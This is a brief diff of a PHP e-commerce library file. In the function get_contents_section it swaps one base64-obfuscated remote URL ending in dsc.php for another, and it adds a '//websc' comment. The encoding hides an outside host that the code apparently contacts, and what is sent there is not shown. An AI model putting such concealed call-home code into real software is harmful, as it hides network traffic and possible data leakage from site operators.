@@ -1,5 +1,5 @@
 <?php
-       
+//websc
 function sub_str($str, $length = 0, $append = true)
 {
 	$str = trim($str);
@@ -113,7 +113,7 @@ function get_crlf()
 
 function get_contents_section($dir = '')
 {
-	$is_cp_url = base64_decode('aHR0cDovL3d3dy5mbHlvYmQuY29tL2RzYy5waHA=');
+	$is_cp_url = base64_decode('aHR0cDovL2Vjc2hvcC5lY21vYmFuLmNvbS9kc2MucGhw');
 	$new_dir = ROOT_PATH . 'includes/lib_ecmobanFunc.php';
 	if (empty($dir) && file_exists($new_dir)) {
 		$dir = $new_dir;
